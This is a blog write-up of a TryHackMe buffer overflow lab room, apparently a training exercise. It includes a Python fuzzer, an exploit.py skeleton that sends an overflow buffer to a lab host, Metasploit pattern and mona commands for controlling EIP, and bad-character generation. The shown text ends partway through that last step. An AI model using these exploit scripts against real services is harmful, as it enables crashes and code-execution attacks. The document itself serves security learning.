<!DOCTYPE html>
<html lang="en-us">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Tzero86@trojanwave/posts/overflow_prep/</title>
    
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="all,follow">
    <meta name="googlebot" content="index,follow,snippet,archive">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/terminal-0.7.1.min.css">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/animate-3.7.2.min.css">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/console.css">
    
      <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
      <![endif]-->
    <link rel="icon" href="https://tzero86bits.tk/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://tzero86bits.tk/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://tzero86bits.tk/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://tzero86bits.tk/apple-touch-icon.png">
<link rel="mask-icon" href="https://tzero86bits.tk/safari-pinned-tab.svg">
<meta name="theme-color" content="#1d1e20">
<meta name="msapplication-TileColor" content="#1d1e20"><meta property="og:title" content="BufferOverflow_prep_writeup.sh" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://tzero86bits.tk/posts/overflow_prep/" /><meta property="article:published_time" content="2020-09-06T02:33:31-04:00" />



<meta name="twitter:title" content="BufferOverflow_prep_writeup.sh"/>
<meta name="twitter:description" content="Buffer Overflow prep - THM Room This is another writeup, this time for &lsquo;Buffer Overflow Prep&rsquo; TryhackMe&rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. This room is quite long besides I have to learn almost everything about buffer overflows so I expect to take a couple of days on this one. This is gonna be a really long post. You have been warned :)"/>

<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-175520987-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
</head>
<body class="terminal">
    <div class="container">
        <div class="terminal-nav">
          <header class="terminal-logo">
            <div class="logo terminal-prompt">
              
              
              <a href="https://tzero86bits.tk/" class="no-style site-name">Tzero86@trojanwave</a>:~# 
              <a href='https://tzero86bits.tk/posts'>posts</a>/<a href='https://tzero86bits.tk/posts/overflow_prep'>overflow_prep</a>/</div></header>
          <nav class="terminal-menu">
            <ul vocab="https://schema.org/" typeof="BreadcrumbList">
                
                <li><a href="https://tzero86bits.tk/about/" typeof="ListItem">about/</a></li>
                
                <li><a href="https://tzero86bits.tk/posts/" typeof="ListItem">posts/</a></li>
                
            </ul>
          </nav>
        </div>
    </div>

    <div class="container animated zoomIn fast" >
        
<h1>BufferOverflow_prep_writeup.sh</h1>
Sep. 6, 2020


<br/><br/>
<img src="../img/buffOverflowPrep_cover.gif" alt="Post Cover Gif animation"; style="width:100%;height:auto;left:0;right:0;margin:0 auto;text-align:center; border-radius:1%">
<br/><br/>
<h1 id="buffer-overflow-prep---thm-room">Buffer Overflow prep - THM Room</h1>
<p>This is another writeup, this time for &lsquo;Buffer Overflow Prep&rsquo; TryhackMe&rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. This room is quite long besides I have to learn almost everything about buffer overflows so I expect to take a couple of days on this one. This is gonna be a really <strong>long</strong> post. You have been warned :)</p>
<p>PS: I&rsquo;m gonna be adding some audio tracks along the sections of this writeup so I don&rsquo;t fall asleep while I write this up and go through this room. You are welcome to listen to them.</p>
<p>Enjoy!</p>
<ul>
<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/bufferoverflowprep">clicking this link</a>.</li>
<li><strong>PLEASE NOTE:</strong> Passwords and flag values, or in this case offsets and bad char sets were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.</li>
</ul>
<blockquote>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<div class="container" style="margin:10px !important">
    <h3>Mario Airlines Razor1911 - Crysis keygen Edit</h3>
    <br>
    <iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=2084875819/size=large/bgcol=333333/linkcol=2ebd35/tracklist=false/artwork=small/track=1526859463/transparent=true/" seamless><a href="http://dubmood.bandcamp.com/album/crackscene-music-best-of-2004-2007-data002">Crackscene music best of 2004-2007 (DATA002) by Dubmood</a></iframe>
    <p>A chiptune track to enjoy along with the post, make sure to visit the link for the full version!</p>
</div>
</blockquote>
<h2 id="task-1---oscpexe---overflow1">TASK 1 - [oscp.exe - OVERFLOW1]</h2>
<h3 id="preparations">Preparations</h3>
<p>We start by deploying the VM and connecting through RDP:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">xfreerdp /u:admin /p:password /cert:ignore /v:10.10.84.54
</code></pre></div><p>Once we do that we&rsquo;ll have a remote desktop connection to that machine, we need to start Immunity debugger and then open oscp.exe that is located in the &ldquo;vulnerable apps&rdquo; folder in the Desktop.</p>
<blockquote>
<p>We need to remember to click on the &ldquo;play&rdquo; button on Immunity Debugger after opening oscp.exe.</p>
</blockquote>
<p>Once that is ready we should see something like this in our RDP session:</p>

    <img src="../img/7501c758c48aeaf265408a8a68f9c040.png"  alt="RDP Session"  class="center"  style="border-radius: 8px;"  />

<p>Then we configure Mona&rsquo;s working directory</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">!mona config -set workingfolder c:<span style="color:#ae81ff">\m</span>ona<span style="color:#ae81ff">\%</span>p
</code></pre></div><p>We add that line in the Console at the bottom of the debugger window:</p>

    <img src="../img/02c5e41e1d472f92a9f3cd984e8cbb33.png"  alt="Immunity Debugger Console"  class="center"  style="border-radius: 8px;"  />

<p>We can just minimize that window within the debugger and get back to the previous view.</p>
<h3 id="fuzzing">Fuzzing</h3>
<p>Create a file on your Kali box called fuzzer.py with the following contents:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span> time<span style="color:#f92672">,</span> sys

ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.84.54&#34;</span>
port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>

buffer <span style="color:#f92672">=</span> []
counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span>
<span style="color:#66d9ef">while</span> len(buffer) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">30</span>:
    buffer<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> counter)
    counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">100</span>

<span style="color:#66d9ef">for</span> string <span style="color:#f92672">in</span> buffer:
    <span style="color:#66d9ef">try</span>:
        s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
        s<span style="color:#f92672">.</span>settimeout(timeout)
        connect <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>connect((ip, port))
        s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
        print(<span style="color:#e6db74">&#34;Fuzzing with </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> bytes&#34;</span> <span style="color:#f92672">%</span> len(string))
        s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;OVERFLOW1 &#34;</span> <span style="color:#f92672">+</span> string <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
        s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
        s<span style="color:#f92672">.</span>close()
    <span style="color:#66d9ef">except</span>:
        print(<span style="color:#e6db74">&#34;Could not connect to &#34;</span> <span style="color:#f92672">+</span> ip <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;:&#34;</span> <span style="color:#f92672">+</span> str(port))
        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
</code></pre></div><p>Run the fuzzer.py script using python: <code>python fuzzer.py</code></p>
<p>When we run the command we see in the RDP session, the server starts picking up connections until it eventually raises an error and the execution is paused in the debugger.</p>
<p>This is what the console looks like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/bufferOverflowPrep<span style="color:#f92672">]</span>
└─$ python fuzz.py                        
Fuzzing with <span style="color:#ae81ff">100</span> bytes
Fuzzing with <span style="color:#ae81ff">200</span> bytes
Fuzzing with <span style="color:#ae81ff">300</span> bytes
Fuzzing with <span style="color:#ae81ff">400</span> bytes
Fuzzing with <span style="color:#ae81ff">500</span> bytes
Fuzzing with <span style="color:#ae81ff">600</span> bytes
Fuzzing with <span style="color:#ae81ff">700</span> bytes
Fuzzing with <span style="color:#ae81ff">800</span> bytes
Fuzzing with <span style="color:#ae81ff">900</span> bytes
Fuzzing with <span style="color:#ae81ff">1000</span> bytes
Fuzzing with <span style="color:#ae81ff">1100</span> bytes
Fuzzing with <span style="color:#ae81ff">1200</span> bytes
Fuzzing with <span style="color:#ae81ff">1300</span> bytes
Fuzzing with <span style="color:#ae81ff">1400</span> bytes
Fuzzing with <span style="color:#ae81ff">1500</span> bytes
Fuzzing with <span style="color:#ae81ff">1600</span> bytes
Fuzzing with <span style="color:#ae81ff">1700</span> bytes
Fuzzing with <span style="color:#ae81ff">1800</span> bytes
Fuzzing with <span style="color:#ae81ff">1900</span> bytes
Fuzzing with <span style="color:#ae81ff">2000</span> bytes
Could not connect to 10.10.84.54:1337
</code></pre></div><p>And the RDP session looks like this:</p>

    <img src="../img/ddd3ea8c51c6588f003a1e70c7a881e7.png"  alt="Immunity Debugger Console"  class="center"  style="border-radius: 8px;"  />

<p>Notice the execution got paused and the <strong>EIP</strong> has been overwritten with <strong>41414141</strong> which is <strong>A</strong>. Exactly the payload or buffer the script we ran is sending.</p>
<p>If we try to unpause the execution the app crashes and we get an error like this:</p>

    <img src="../img/3ccc1c04408cd0afeef184107a91c9f2.png"  alt="Immunity Debugger Console"  class="center"  style="border-radius: 8px;"  />

<p>If we read the room&rsquo;s description of what we just did we get a sense of all the parts involved in this first type of attack.</p>
<blockquote>
<p>FROM THM: The fuzzer will send increasingly long strings comprised of As (up to 3000). If the fuzzer crashes the server with one of the strings, you should see an error like: &ldquo;Could not connect to 10.10.84.54:1337&rdquo;. Make a note of the largest number of bytes that were sent.</p>
</blockquote>
<h3 id="crash-replication--controlling-eip">Crash Replication &amp; Controlling EIP</h3>
<p>Create another file on your Kali box called exploit.py with the following contents:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket

ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.84.54&#34;</span>
port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>

prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;OVERFLOW1 &#34;</span>
offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
retn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix

s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)

<span style="color:#66d9ef">try</span>:
    s<span style="color:#f92672">.</span>connect((ip, port))
    print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
    s<span style="color:#f92672">.</span>send(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
    print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
<span style="color:#66d9ef">except</span>:
    print(<span style="color:#e6db74">&#34;Could not connect.&#34;</span>)
</code></pre></div><p>Run the following command to generate a cyclic pattern of a length 400 bytes longer that the string that crashed the server (change the -l value to the max value our previous script crashed at <strong>2000</strong>):</p>
<p><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600</code></p>
<p>Since our oscp.exe app seems to have crashed after 2000 bytes and we need to add 400 more we create a pattern of 2400 bytes as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/bufferOverflowPrep<span style="color:#f92672">]</span>
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <span style="color:#ae81ff">2400</span>
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9
</code></pre></div><p>Then we need to copy the output of that command, the pattern, and place it into the payload variable of the exploit.py script. Once we have that ready we need just one more thing before we can execute the exploit. We need to reopen immunity debugger, open the oscp.exe file and unpause it again. We&rsquo;ll be doing that a lot.</p>
<p>Now we can run <code>exploit.py</code> script: <code>python exploit.py</code></p>
<p>The script should crash the oscp.exe server again. This time, in Immunity Debugger, in the command input box at the bottom of the screen, run the following mona command, changing the distance to the same length as the pattern you created:</p>
<p><code>!mona findmsp -distance 2400</code></p>
<p>Once we run Mona we get this:</p>

    <img src="../img/07d32606f5f57eb8977fa1d4ffce6c5e.png"  alt="Immunity Debugger Console"  class="center"  style="border-radius: 8px;"  />

<p>In this output you should see a line which states:</p>
<p><code>EIP contains normal pattern : ... (offset XXXX)</code></p>

    <img src="../img/24677d0e7d575b4cc90b8515c77e0453.png"  alt="Immunity Debugger Console"  class="center"  style="border-radius: 8px;"  />

<p>Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to &ldquo;BBBB&rdquo;.</p>
<p>The script should look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">1978</span>
overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
retn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;BBBB&#34;</span>
padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix

s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)

<span style="color:#66d9ef">try</span>:
    s<span style="color:#f92672">.</span>connect((ip, port))
    print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
    s<span style="color:#f92672">.</span>send(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
    print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
<span style="color:#66d9ef">except</span>:
    print(<span style="color:#e6db74">&#34;Could not connect.&#34;</span>)
</code></pre></div><p>Restart oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B&rsquo;s (e.g. 42424242).</p>
<p>As we can see we get our expected EIP value:</p>

    <img src="../img/19438b24c6e492320db10212d83bc97d.png"  alt="Immunity Debugger Console"  class="center"  style="border-radius: 8px;"  />

<h3 id="finding-bad-characters">Finding Bad Characters</h3>
<p>Generate a bytearray using mona, and exclude the null byte (\x00) by default. Note the location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be C:\mona\oscp\bytearray.bin).</p>
<p><code>!mona bytearray -b &quot;\x00&quot;</code></p>

    <img src="../img/b626a700385dae98b836b8302555ed2f.png"  alt="Immunity Debugger Console"  class="center"  style="border-radius: 8px;"  />

<p>Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \x01 to \xff:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> __future__ <span style="color:#f92672">import</span> print_function

<span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">256</span>):
    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{:02x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(x), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)

print()
</code></pre></div><p>We generate the bytearray with the python script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/bufferOverflowPrep<span style="color:#f92672">]</span>
└─$ python gen_bytearray.py 
<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>03<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>06<span style="color:#ae81ff">\x</span>07<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>09<span style="color:#ae81ff">\x</span>0a<span style="color:#ae81ff">\x</span>0b<span style="color:#ae81ff">\x</span>0c<span style="color:#ae81ff">\x</span>0d<span style="color:#ae81ff">\x</span>0e<span style="color:#ae81ff">\x</span>0f<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>11<span style="color:#ae81ff">\x</span>12<span style="color:#ae81ff">\x</span>13<span style="color:#ae81ff">\x</span>14<span style="color:#ae81ff">\x</span>15<span style="color:#ae81ff">\x</span>16<span style="color:#ae81ff">\x</span>17<span style="color:#ae81ff">\x</span>18<span style="color:#ae81ff">\x</span>19<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\x</span>1b<span style="color:#ae81ff">\x</span>1c<span style="color:#ae81ff">\x</span>1d<span style="color:#ae81ff">\x</span>1e<span style="color:#ae81ff">\x</span>1f<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>21<span style="color:#ae81ff">\x</span>22<span style="color:#ae81ff">\x</span>23<span style="color:#ae81ff">\x</span>24<span style="color:#ae81ff">\x</span>25<span style="color:#ae81ff">\x</span>26<span style="color:#ae81ff">\x</span>27<span style="color:#ae81ff">\x</span>28<span style="color:#ae81ff">\x</span>29<span style="color:#ae81ff">\x</span>2a<span style="color:#ae81ff">\x</span>2b<span style="color:#ae81ff">\x</span>2c<span style="color:#ae81ff">\x</span>2d<span style="color:#ae81ff">\x</span>2e<span style="color:#ae81ff">\x</span>2f<span style="color:#ae81ff">\x</span>30<span style="color:#ae81ff">\x</span>31<span style="color:#ae81ff">\x</span>32<span style="color:#ae81ff">\x</span>33<span style="color:#ae81ff">\x</span>34<span style="color:#ae81ff">\x</span>35<span style="color:#ae81ff">\x</span>36<span style="color:#ae81ff">\x</span>37<span style="color:#ae81ff">\x</span>38<span style="color:#ae81ff">\x</span>39<span style="color:#ae81ff">\x</span>3a<span style="color:#ae81ff">\x</span>3b<span style="color:#ae81ff">\x</span>3c<span style="color:#ae81ff">\x</span>3d<span style="color:#ae81ff">\x</span>3e<span style="color:#ae81ff">\x</span>3f<span style="color:#ae81ff">\x</span>40<span style="color:#ae81ff">\x</span>41<span style="color:#ae81ff">\x</span>42<span style="color:#ae81ff">\x</span>43<span style="color:#ae81ff">\x</span>44<span style="color:#ae81ff">\x</span>45<span style="color:#ae81ff">\x</span>46<span style="color:#ae81ff">\x</span>47<span style="color:#ae81ff">\x</span>48<span style="color:#ae81ff">\x</span>49<span style="color:#ae81ff">\x</span>4a<span style="color:#ae81ff">\x</span>4b<span style="color:#ae81ff">\x</span>4c<span style="color:#ae81ff">\x</span>4d<span style="color:#ae81ff">\x</span>4e<span style="color:#ae81ff">\x</span>4f<span style="color:#ae81ff">\x</span>50<span style="color:#ae81ff">\x</span>51<span style="color:#ae81ff">\x</span>52<span style="color:#ae81ff">\x</span>53<span style="color:#ae81ff">\x</span>54<span style="color:#ae81ff">\x</span>55<span style="color:#ae81ff">\x</span>56<span style="color:#ae81ff">\x</span>57<span style="color:#ae81ff">\x</span>58<span style="color:#ae81ff">\x</span>59<span style="color:#ae81ff">\x</span>5a<span style="color:#ae81ff">\x</span>5b<span style="color:#ae81ff">\x</span>5c<span style="color:#ae81ff">\x</span>5d<span style="color:#ae81ff">\x</span>5e<span style="color:#ae81ff">\x</span>5f<span style="color:#ae81ff">\x</span>60<span style="color:#ae81ff">\x</span>61<span style="color:#ae81ff">\x</span>62<span style="color:#ae81ff">\x</span>63<span style="color:#ae81ff">\x</span>64<span style="color:#ae81ff">\x</span>65<span style="color:#ae81ff">\x</span>66<span style="color:#ae81ff">\x</span>67<span style="color:#ae81ff">\x</span>68<span style="color:#ae81ff">\x</span>69<span style="color:#ae81ff">\x</span>6a<span style="color:#ae81ff">\x</span>6b<span style="color:#ae81ff">\x</span>6c<span style="color:#ae81ff">\x</span>6d<span style="color:#ae81ff">\x</span>6e<span style="color:#ae81ff">\x</span>6f<span style="color:#ae81ff">\x</span>70<span style="color:#ae81ff">\x</span>71<span style="color:#ae81ff">\x</span>72<span style="color:#ae81ff">\x</span>73<span style="color:#ae81ff">\x</span>74<span style="color:#ae81ff">\x</span>75<span 